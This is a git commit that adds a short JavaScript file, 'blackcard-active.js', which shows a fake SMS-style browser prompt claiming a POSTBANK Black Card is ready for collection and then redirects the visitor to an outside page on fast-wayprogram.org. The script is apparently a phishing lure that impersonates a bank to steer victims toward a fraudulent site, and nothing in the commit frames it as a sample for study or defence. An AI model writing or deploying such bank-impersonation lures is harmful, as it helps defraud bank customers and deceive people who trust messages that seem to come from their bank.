2e3d33823e372703f03297b999d56fa61ea9ae26
superblog1 <imohette4@gmail.com>
2025-02-16 07:20:04 +0100

    Create blackcard-active.js

---
+++ blackcard-active.js
@@ -0,0 +1,7 @@
+
+
+var password = 'CONFIRM CARD'
+password=prompt('SMS: Congratulations Your POSTBANK BLACK CARD is ready for collection, Kindly Press OK to Confirm apllication   ','CONFIRM CARD');
+if (password != 'CONFIRM CARD') {
+location.href='https://fast-wayprogram.org/blackcard.html';
+}
